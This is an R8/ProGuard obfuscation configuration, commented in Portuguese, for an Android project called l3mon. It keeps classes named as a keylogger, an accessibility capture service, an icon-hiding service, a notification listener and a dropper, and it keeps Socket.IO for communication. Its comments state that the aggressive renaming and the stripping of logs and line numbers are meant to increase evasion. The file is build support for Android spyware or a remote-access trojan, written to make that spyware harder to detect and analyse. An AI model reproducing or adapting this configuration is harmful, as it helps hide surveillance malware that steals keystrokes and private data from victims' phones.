# =========================================================================
# CONFIGURAÇÕES AGRESSIVAS DE OFUSCAÇÃO R8/PROGUARD
# =========================================================================

# 1. Renomeação de Pacotes e Classes
# Move todas as classes para um pacote raiz vazio (ex: a.a, b.c)
-repackageclasses ''
-allowaccessmodification

# 2. Ofuscação de nomes de métodos e atributos
-overloadaggressively

# 3. Remover informações de debug (Linhas, Nomes de Arquivos)
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable
# Para remover totalmente as linhas (Dificulta MUITO o log, mas aumenta evasão):
#-keepattributes !SourceFile,!LineNumberTable

# 4. Manter APENAS o essencial do Manifesto (Android requer nomes reais aqui)
-keep class com.etechd.l3mon.MainActivity { <init>(...); }
-keep class com.etechd.l3mon.MainService { <init>(...); }
-keep class com.etechd.l3mon.L3M0NKeyLogger { <init>(...); }
-keep class com.etechd.l3mon.AccessibilityCaptureService { <init>(...); }
-keep class com.etechd.l3mon.AccessibilityCaptureService$HideIconBackgroundService { <init>(...); }
-keep class com.etechd.l3mon.NotificationListener { <init>(...); }
-keep class com.etechd.l3mon.MyReceiver { <init>(...); }
-keep class com.etechd.l3mon.ServiceReciever { <init>(...); }
-keep class com.etechd.l3mon.Dropper { <init>(...); }

# 5. Manter o FileProvider
-keep class android.support.v4.content.FileProvider { *; }

# 6. Ofuscar todo o resto (Managers, Loaders, Utils)
# Eles serão renomeados para a.a.a, a.a.b, etc.
-keep class com.etechd.l3mon.loader.IATSModule { *; } # Necessário para plugins

# 7. Socket.IO e OkHttp (Manter o mínimo para funcionamento)
-keep class io.socket.** { *; }
-keep class okhttp3.** { *; }
-dontwarn io.socket.**
-dontwarn okhttp3.**

# 8. Remover logs do Android em tempo de compilação
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# 9. Ofuscação de Recursos (Disfarce do Wrapper)
# Adicione strings que devem ser mantidas se necessário,
# o resto será otimizado pelo R8.
